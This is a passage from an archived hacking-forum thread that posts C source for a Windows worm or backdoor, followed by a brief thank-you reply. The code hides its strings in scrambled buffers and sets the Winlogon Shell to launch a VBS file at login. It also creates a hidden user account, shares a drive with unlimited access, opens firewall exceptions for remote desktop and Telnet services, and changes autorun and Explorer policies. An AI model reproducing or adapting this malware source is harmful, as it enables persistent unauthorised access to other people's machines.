+					   &quot;\xE1\xF4\xE1\xBE\xE6\xBC\x87\xAB\xA9\xB9\xAC\x8F\xFF\xB2&quot;\
+					   &quot;\x83\xD8\xED\xB1\xB1\xC9\xC5\xFF\xE3\xE1\x88\x9F&quot;;
+	/*&quot;CSCFlags=0\0MaxUses=4294967295\0Path=D:\\\0Permissions=0\0Remark=\0Type=0\0&quot;;*/
+	plainbuffer[106] = NULL;
+//--------String section end-----------
+}
+}
+#pragma data_seg()
+/*-------------------Enhancement circuit------------------*/
+void enhancement(void)	{
+	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
+	HKEY hEnhance = NULL;
+	LPCTSTR subkey = plainbuffer[18];//&quot;Control Panel\\Desktop&quot;;
+	CONST BYTE value[] = &quot;30&quot;;
+	CONST BYTE value1[] = &quot;60&quot;;
+	CONST BYTE value2[] = &quot;1&quot;;	// Use it wherever required.
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+		RegSetValueEx(hEnhance, plainbuffer[12]/*&quot;MenuShowDelay&quot;*/, 0, REG_SZ, value, sizeof (value));
+		RegCloseKey(hEnhance);hEnhance = NULL;
+	}
+	subkey = plainbuffer[13];//&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer&quot;;
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+		RegSetValueEx(hEnhance, plainbuffer[14]/*&quot;NoDriveTypeAutoRun&quot;*/, 0, REG_SZ, value1, sizeof (value1));
+		RegCloseKey(hEnhance);hEnhance = NULL;
+	}
+//------------------Administrative section----------------//
+	subkey = plainbuffer[15];//&quot;CurrentControlSet\\Control\\Session Manager\\Memory Management&quot;;
+	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, subkey, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+		RegSetValueEx(hEnhance, plainbuffer[16]/*&quot;DisablePagingExecutive&quot;*/, 0, REG_SZ, value2, sizeof (value2));
+		RegSetValueEx(hEnhance, plainbuffer[17]/*&quot;LargeSystemCache&quot;*/, 0, REG_SZ, value2, sizeof (value2));
+		RegCloseKey(hEnhance);hEnhance = NULL;
+	}
+//-------------------Fail-safe section----------------//
+	HKEY hFailsafe = NULL;
+	LPCTSTR fsubkey = plainbuffer[18];//&quot;Control Panel\\Desktop&quot;;
+	LPCTSTR fsubkey1 = plainbuffer[19];//&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced&quot;;
+	LPCTSTR shellsubkey = plainbuffer[20];//&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;;
+	LPCTSTR accsubkey = plainbuffer[21];//*/&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList&quot;;
+	LPCTSTR restorsubkey = &quot;SYSTEM\\CurrentControlSet\\Services\\srservice&quot;;
+	CONST BYTE fsval1[] = &quot;0&quot;;
+	CONST BYTE dwval[] = &quot;\x00\x00\x00\x00&quot;;	// not scrambled
+	char *fsval;
+	char *shellval;
+	fsval = saverptr;
+	shellval = plainbuffer[23];//&quot;Explorer.exe winntobj.vbs&quot;;</pre>
+</div>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by fb1h2s; 10-13-2010 at <span class="time">11:02 PM</span>.
+					
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_978" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_978" class="newreply" href="newreply2f4a.html?do=newreply&amp;p=978" rel="nofollow" title="Reply With Quote"><img id="quoteimg_978" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_979">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">05:54 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post979" href="showthreadd8f1.html?t=333&amp;p=979&amp;viewfull=1#post979" class="postcounter">#9</a><a id="postcount979" name="9"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_979_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_979">
+						<blockquote class="postcontent restore ">
+							<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">//-------------------Loop settings--------------------//
+	subkey = plainbuffer[24];//&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer&quot;;
+	LPCTSTR subkey1 = plainbuffer[25];//&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system&quot;;
+	LPCTSTR sharekey = plainbuffer[96];/*&quot;SYSTEM\\ControlSet001\\Services\\lanmanserver\\Shares&quot;;*/
+	LPCTSTR firekey = plainbuffer[97];//&quot;SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List&quot;;
+	LPCTSTR rdeskkey = plainbuffer[98];//&quot;SYSTEM\\ControlSet001\\Services\\mnmsrvc&quot;;
+	LPCTSTR tsubkey = plainbuffer[99];//&quot;SYSTEM\\ControlSet001\\Services\\TlntSvr&quot;;
+
+	CONST BYTE rdeskval[] = &quot;\x02\x00\x00\x00&quot;;
+	char *shval = plainbuffer[105];//&quot;CSCFlags=0\nMaxUses=4294967295\nPath=F:\\\nPermissions=0\nRemark=\nType=0\n&quot;;
+	char buffer[MEDBUFSIZE], tbuffer[MEDBUFSIZE], winbuf[KEYSZ], tbuf[MEDBUFSIZE];
+	memset(buffer, 0, MEDBUFSIZE);memset(tbuffer, 0, MEDBUFSIZE);
+	memset(winbuf, 0, KEYSZ);memset(tbuf, 0, KEYSZ);
+
+	DWORD usize = sizeof(winbuf) - 1;
+	GetSystemDirectory(winbuf, usize);
+	strcpy(tbuf, winbuf);
+	strcat(winbuf, plainbuffer[100]/*&quot;\\mnmsrvc.exe&quot;*/);
+	strcat(tbuf, plainbuffer[101]/*&quot;\\tlntsrv.exe&quot;*/);
+	strcpy(buffer, winbuf);
+	strcat(buffer, plainbuffer[102]/*&quot;:*:Enabled:Retaliator&quot;*/);
+	strcpy(tbuffer, tbuf);
+	strcat(tbuffer, plainbuffer[103]/*&quot;:*:Enabled:Telnet&quot;*/);
+	while(true)	{
+		if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+			RegSetValueEx(hEnhance, plainbuffer[26]/*&quot;SearchHidden&quot;*/, 0, REG_SZ, value2, sizeof (value2));
+			RegCloseKey(hEnhance);hEnhance = NULL;
+		}
+		if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey1, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+			RegSetValueEx(hEnhance, plainbuffer[27]/*&quot;DisableRegistryTools&quot;*/, 0, REG_SZ, fsval1, sizeof (fsval1));
+			RegSetValueEx(hEnhance, plainbuffer[28]/*&quot;DisableTaskmgr&quot;*/, 0, REG_SZ, fsval1, sizeof (fsval1));
+			RegCloseKey(hEnhance);hEnhance = NULL;
+		}
+		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, subkey1, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+			RegSetValueEx(hEnhance, plainbuffer[27]/*&quot;DisableRegistryTools&quot;*/, 0, REG_SZ, fsval1, sizeof (fsval1));
+			RegSetValueEx(hEnhance, plainbuffer[28]/*&quot;DisableTaskmgr&quot;*/, 0, REG_SZ, fsval1, sizeof (fsval1));
+			RegCloseKey(hEnhance);hEnhance = NULL;
+		}
+		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, shellsubkey, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+			RegSetValueEx(hEnhance, plainbuffer[29]/*&quot;Shell&quot;*/, 0, REG_SZ, (const unsigned char *)shellval, lstrlen(shellval));			
+			RegCloseKey(hEnhance);hEnhance = NULL;
+			cruser();
+			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, accsubkey, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+				RegSetValueEx(hEnhance, plainbuffer[30]/*/&quot;natsec&quot;/**/, 0, REG_DWORD, dwval, sizeof (DWORD));			
+				RegCloseKey(hEnhance);hEnhance = NULL;
+			}
+			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, sharekey, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+				RegSetValueEx(hEnhance, plainbuffer[30]/*/&quot;natsec&quot;/**/, 0, REG_MULTI_SZ, (const unsigned char *)shval, 68);			
+				RegCloseKey(hEnhance);hEnhance = NULL;
+			}
+			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, firekey, 0, KEY_ALL_ACCESS, &amp;hEnhance) == ERROR_SUCCESS)	{
+				RegSetValueEx(hEnhance, /*plainbuffer[30]/*/winbuf/**/, 0, REG_SZ, (const unsigned char *)buffer, lstrlen(buffer));
+				RegSetValueEx(hEnhance, /*plainbuffer[30]/*/tbuf/**/, 0, REG_SZ, (const unsigned char *)tbuffer, lstrlen(tbuffer));			
+				RegCloseKey(hEnhance);hEnhance = NULL;
+			}</pre>
+</div>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by fb1h2s; 10-13-2010 at <span class="time">11:03 PM</span>.
+					
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_979" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_979" class="newreply" href="newreply1524.html?do=newreply&amp;p=979" rel="nofollow" title="Reply With Quote"><img id="quoteimg_979" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_13452">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">07-14-2014,&nbsp;<span class="time">05:50 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post13452" href="showthread137d.html?t=333&amp;p=13452&amp;viewfull=1#post13452" class="postcounter">#10</a><a id="postcount13452" name="10"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberc21f.html?u=10286" title="dotcppfile is offline"><strong>dotcppfile</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberc21f.html?u=10286" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="search2fcd.html?do=finduser&amp;userid=10286&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="private5953.html?do=newpm&amp;u=10286" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogc21f.html?u=10286" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		<li class="left">
+			<a href="../external.html?link=https://dotcppfile.wordpress.com/" class="siteicon_homepage">
+				Visit Homepage
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="listda54.html?r=author/10286-dotcppfile" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="dotcppfile is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Garage Newcomer
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_13452_10286" title="dotcppfile is on a distinguished road">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>May 2014</dd>
+					
+					
+					<dt>Posts</dt> <dd>31</dd>	
+					
+				</dl>
+				
+				
+				<div class="imlinks">
+					    <a href="javascript://" onclick="imwindow('skype', '10286', 500, 340); return false;"><img src="../mystatus.skype.com/smallicon/dotcppfile" alt="Send a message via Skype&trade; to dotcppfile" /></a>
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_13452">
+						<blockquote class="postcontent restore ">
+							Thanks a lot for sharing something so valuable.
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				
+				
+				
+					<blockquote class="signature restore"><div class="signaturecontainer"><div style="text-align: center;">XMPP: <br /><span class="smallfont"><i>To view links or images in signatures your post count must be 10 or greater. You currently have 0 posts.</i></span><br /><br />
+Blog: <br /><span class="smallfont"><i>To view links or images in signatures your post count must be 10 or greater. You currently have 0 posts.</i></span><br /></div></div></blockquote>
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_13452" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_13452" class="newreply" href="newreply579a.html?do=newreply&amp;p=13452" rel="nofollow" title="Reply With Quote"><img id="quoteimg_13452" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+		</ol>
+                <div class="separator"></div>
+		<div class="postlistfoot">
+			
+		</div>
+
+	
+
+</div>
+
+<div id="below_postlist" class="noinlinemod below_postlist">
+	
+	<div id="pagination_bottom" class="pagination_bottom">
+	
+		<form action="../external.html?link=http://garage4hackers.com/showthread.php?t=333&amp;page=3&amp;p=961" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="333" /><input type="hidden" name="p" value="961" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 4</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 34">1</a></span><span><a href="showthread4b5d.html?t=333&amp;page=2&amp;p=961" title="Show results 11 to 20 of 34">2</a></span><span><a href="showthread0431.html?t=333&amp;page=3&amp;p=961" title="Show results 21 to 30 of 34">3</a></span>
+		
+		<span class="separator">...</span>
+		
+		
+		<span class="prev_next"><a rel="next" href="showthread4b5d.html?t=333&amp;page=2&amp;p=961" title="Next Page - Results 11 to 20 of 34"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="showthread3536.html?t=333&amp;page=4&amp;p=961" title="Last Page - Results 31 to 34 of 34">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+	
+		<div class="clear"></div>
+<div class="navpopupmenu popupmenu nohovermenu" id="showthread_navpopup">
+	
+		<span class="shade">Quick Navigation</span>
+		<a href="showthreadc7b7.html?t=333" class="popupctrl"><span class="ctrlcontainer">Botnets, Malwares &amp; Rootkits Analysis</span></a>
+		<a href="showthreadc7b7.html?t=333#top" class="textcontrol" onclick="document.location.hash='top';return false;">Top</a>
+	
+	<ul class="navpopupbody popupbody popuphover">
+		
+		<li class="optionlabel">Site Areas</li>
+		<li><a href="usercp.html">Settings</a></li>
+		<li><a href="private.html">Private Messages</a></li>
+		<li><a href="subscription.html">Subscriptions</a></li>
+		<li><a href="online.html">Who's Online</a></li>
+		<li><a href="search.html">Search Forums</a></li>
+		<li><a href="forum.html">Forums Home</a></li>
+		
+			<li class="optionlabel">Forums</li>
+			
+		
+			
+				<li><a href="forumdisplay58da.html?f=1">Garage Network</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay12a3.html?f=2">Garage Announcements</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaye57d.html?f=58">Bravo - Null 2012</a></li>
+			
+		
+			
+				<li><a href="forumdisplay0756.html?f=59">Garage Local Chapter Meets</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay31e6.html?f=4">Garage Rules</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye774.html?f=5">Feedback &amp; Suggestions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayd42b.html?f=7">Introduce Your Self</a></li>
+			
+		
+			
+				<li><a href="forumdisplay2b89.html?f=38">Shout-box</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplaycf19.html?f=6">Garage Lounge</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay5579.html?f=30">Hacking for Beginners</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay6ac3.html?f=57">Did You Know?</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay957d.html?f=8">Security &amp; Hacking News Thread</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3215.html?f=36">Career in InfoSec</a></li>
+			
+		
+			
+				<li><a href="forumdisplay814c.html?f=29">Request Zone</a></li>
+			
+		
+			
+				<li><a href="forumdisplay13b6.html?f=27">Noobs Corner</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplayfac0.html?f=55">Tip | Trick of the Day</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4a6.html?f=66">ICS / SCADA Security</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6111.html?f=67">Internet of Things - IoT</a></li>
+			
+		
+			
+				<li><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaya05c.html?f=56">Post Exploitation</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay8a83.html?f=11">Web Application Penetration Testing</a></li>
+			
+		
+			
+				<li><a href="forumdisplay01c9.html?f=12">Wireless and Bluetooth Hacking</a></li>
+			
+		
+			
+				<li><a href="forumdisplay48ab.html?f=17">Computer Forensics and Incident Handling</a></li>
+			
+		
+			
+				<li><a href="forumdisplay218b.html?f=19">Physical Security and Social Engineering</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb09f.html?f=15">General Security &amp; Best Practices</a></li>
+			
+		
+			
+				<li><a href="forumdisplay907f.html?f=42">Security and Hacking Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplay9e0d.html?f=54">Mobile Security</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay9780.html?f=14">General Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay9df8.html?f=31">Programming</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay65b9.html?f=35">Assembly</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4f1.html?f=32">C/C++</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb0a0.html?f=34">Perl</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb8c1.html?f=60">PHP</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6c4e.html?f=33">Python</a></li>
+			
+		
+			
+				<li><a href="forumdisplay208f.html?f=51">Linux Shell / Bash Programming</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3238.html?f=47">Windows Batch Programming</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayce40.html?f=28">BackTrack and Other Linux Distributions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf2fa.html?f=16">Networks &amp; Networking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya213.html?f=18">Cloud Computing</a></li>
+			
+		
+			
+				<li><a href="forumdisplaydfa4.html?f=39">Security Podcast and Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya3f5.html?f=40">Miscellanous Thread</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay30ac.html?f=49">Brush Up Your Skills</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayffeb.html?f=20">Experts Forum</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplaycdba.html?f=48">My Meanest Hacks</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf6ac.html?f=37">Hacking &amp; Security Books and Tutorials</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8011.html?f=23">Tools &amp; Scripts</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
+			
+		
+			
+				<li><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
+			
+		
+			
+				<li><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye5f3.html?f=64">Browser Fuzzing</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+		
+	</ul>
+</div>
+<div class="clear"></div>
+	</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+<!-- next / previous links -->
+<div class="navlinks">
+	
+	<strong>&laquo;</strong>
+	<a href="showthread91ff.html?t=333&amp;goto=nextoldest" rel="nofollow">Previous Thread</a>
+	|
+	<a href="showthread4c64.html?t=333&amp;goto=nextnewest" rel="nofollow">Next Thread</a>
+	<strong>&raquo;</strong>
+	
+</div>
+<!-- / next / previous links -->
+
+<div id="thread_info" class="thread_info">
+	
+	
+	
+	
+	<h4 class="threadinfohead"><span class="optiontitle">Tags for this Thread</span></h4>
+	<div id="thread_tags_list" class="thread_info_block">
+		<div class="inner_block">
+			
+			<div id='tag_list_cell'>
+				
+		
+			<a href="tagsc0d2.html?tag=natsec">natsec</a>
+		
+
+<img src="images/misc/11x11progress.html" id="tag_form_progress" class="inlineimg hidden" alt="" />
+			</div>
+			<p>
+				<a href="tags.html">View Tag Cloud</a>
+			</p>
+		</div>
+	</div>
+	
+	<div class="options_block_container">
+		
+		<div class="options_block">
+			<h4 class="collapse">
+				<a class="collapse" id="collapse_posting_rules" href="showthreadc7b7.html?t=333#top"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				<span class="optiontitle">Posting Permissions</span>
+			</h4>
+			<div id="posting_rules" class="thread_info_block">
+				
+<div id="forumrules" class="info_subblock">
+
+	<ul class="youcandoblock">
+		<li>You <strong>may not</strong> post new threads</li>
+		<li>You <strong>may not</strong> post replies</li>
+		<li>You <strong>may not</strong> post attachments</li>
+		<li>You <strong>may not</strong> edit your posts</li>
+		<li>&nbsp;</li>
+	</ul>
+	<div class="bbcodeblock">
+		<ul>
+			<li><a href="miscaff0.html?do=bbcode" target="_blank">BB code</a> is <strong>On</strong></li>
+			<li><a href="misc9712.html?do=showsmilies" target="_blank">Smilies</a> are <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#imgcode" target="_blank">[IMG]</a> code is <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#videocode" target="_blank">[VIDEO]</a> code is <strong>On</strong></li>
+			<li>HTML code is <strong>Off</strong></li>
+		</ul>
+	</div>
+	<p class="rules_link"><a href="misc17ec.html?do=showrules" target="_blank">Forum Rules</a></p>
+
+</div>
+
+			</div>
+		</div>
+
+	</div>
+
+</div>
+
+
+
+
+
+
+
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
